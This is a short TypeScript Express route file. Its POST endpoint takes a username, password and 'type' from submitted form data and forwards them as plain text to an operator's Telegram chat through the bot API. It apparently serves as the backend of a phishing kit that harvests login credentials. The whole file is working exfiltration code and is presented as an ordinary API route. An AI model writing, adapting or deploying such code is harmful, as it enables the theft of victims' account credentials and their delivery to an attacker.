import { Router, type IRouter } from "express";
import axios from "axios";

const router: IRouter = Router();

router.post("/send", async (req, res) => {
  const { user, pass, type } = req.body;

  if (!user || !pass || !type) {
    res.status(400).json({ error: "Missing required fields: user, pass, type" });
    return;
  }

  const botToken = process.env["TELEGRAM_BOT_TOKEN"];
  const chatId = process.env["TELEGRAM_CHAT_ID"];

  if (!botToken || !chatId) {
    req.log.error("Telegram credentials are not configured");
    res.status(500).json({ error: "Telegram credentials not configured" });
    return;
  }

  const message = `New Request:\nUser: ${user}\nPass: ${pass}\nType: ${type}`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    res.json({ success: true, message: "Sent to Telegram successfully" });
  } catch (err) {
    req.log.error({ err }, "Failed to send message to Telegram");
    res.status(500).json({ error: "Failed to send message to Telegram" });
  }
});

export default router;
